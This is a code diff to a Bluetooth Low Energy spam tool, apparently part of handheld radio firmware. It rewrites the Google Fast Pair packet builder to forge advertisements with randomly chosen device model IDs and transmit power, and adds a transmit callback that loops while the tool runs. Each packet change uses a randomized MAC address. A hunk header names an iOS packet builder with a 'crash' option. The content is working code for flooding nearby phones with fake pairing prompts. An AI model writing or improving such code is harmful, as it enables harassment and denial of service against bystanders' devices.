@@ -104,7 +104,7 @@ BLESpamView::BLESpamView(NavigationView& nav)
     console.writeln("Based on work of:");
     console.writeln("@Willy-JL, @ECTO-1A,");
     console.writeln("@Spooks4576, @iNetro");
-
+    console.writeln("");
     changePacket(true);  // init
 }
 
@@ -138,6 +138,15 @@ void BLESpamView::randomizeMac() {
         mac[i] = hexDigits[randomIndex];
     }
     mac[12] = '\0';  // Null-terminate the string
+}
+
+void BLESpamView::on_tx_progress(const bool done) {
+    if (done) {
+        if (is_running) {
+            changePacket(false);
+            baseband::set_btletx(channel_number, mac, advertisementData, pduType);
+        }
+    }
 }
 
 void BLESpamView::furi_hal_random_fill_buf(uint8_t* buf, uint32_t len) {
@@ -473,23 +482,38 @@ void BLESpamView::createIosPacket(bool crash = false) {
 }
 
 void BLESpamView::createFastPairPacket() {
-    uint32_t model;
-    model = fastpairModels[rand() % fastpairModels_count].value;
+    uint32_t model = fastpairModels[rand() % fastpairModels_count].value;
+    uint8_t size = 14;
+    uint8_t* packet = (uint8_t*)malloc(size);
+    uint8_t i = 0;
+
+    packet[i++] = 3;     // Size
+    packet[i++] = 0x03;  // AD Type (Service UUID List)
+    packet[i++] = 0x2C;  // Service UUID (Google LLC, FastPair)
+    packet[i++] = 0xFE;  // ...
+
+    packet[i++] = 6;                       // Size
+    packet[i++] = 0x16;                    // AD Type (Service Data)
+    packet[i++] = 0x2C;                    // Service UUID (Google LLC, FastPair)
+    packet[i++] = 0xFE;                    // ...
+    packet[i++] = (model >> 0x10) & 0xFF;  // Device Model
+    packet[i++] = (model >> 0x08) & 0xFF;  // ...
+    packet[i++] = (model >> 0x00) & 0xFF;  // ...
+
+    packet[i++] = 2;                     // Size
+    packet[i++] = 0x0A;                  // AD Type (Tx Power Level)
+    packet[i++] = (rand() % 120) - 100;  // -100 to +20 dBm
+
+    // size, packet
+    std::string res = to_string_hex_array(packet, size);
     memset(advertisementData, 0, sizeof(advertisementData));
-    // 0         0     6
-    const char* source = "03032CFE06162CFED5A59E020AB4\0";
-    memcpy(advertisementData, source, 28);
-    advertisementData[16] = uint_to_char((model >> 20) & 0x0F, 16);
-    advertisementData[17] = uint_to_char((model >> 16) & 0x0F, 16);
-    advertisementData[18] = uint_to_char((model >> 12) & 0x0F, 16);
-    advertisementData[19] = uint_to_char((model >> 8) & 0x0F, 16);
-    advertisementData[20] = uint_to_char((model >> 4) & 0x0F, 16);
-    advertisementData[21] = uint_to_char((model >> 0) & 0x0F, 16);
+    std::copy(res.begin(), res.end(), advertisementData);
+    free(packet);
 }
 
 void BLESpamView::changePacket(bool forced = false) {
     counter++;  // need to send it multiple times to be accepted
-    if (counter >= 3 || forced) {
+    if (counter >= 4 || forced) {
         // really change packet and mac.
         counter = 0;
         randomizeMac();
@@ -516,21 +540,15 @@ void BLESpamView::changePacket(bool forced = false) {
         }
         // rate limit console display
         displayCounter++;
-        if (displayCounter > 5) {
+        if (displayCounter > 25) {
             displayCounter = 0;
             console.writeln(advertisementData);
         }
     }
 }
-// called each 1/60th of second, so 6 = 100ms
-void BLESpamView::on_timer() {
-    if (is_running) {
-        changePacket();
-        reset();
-    }
-}
 
 BLESpamView::~BLESpamView() {
+    is_running = false;
     stop();
 }
 
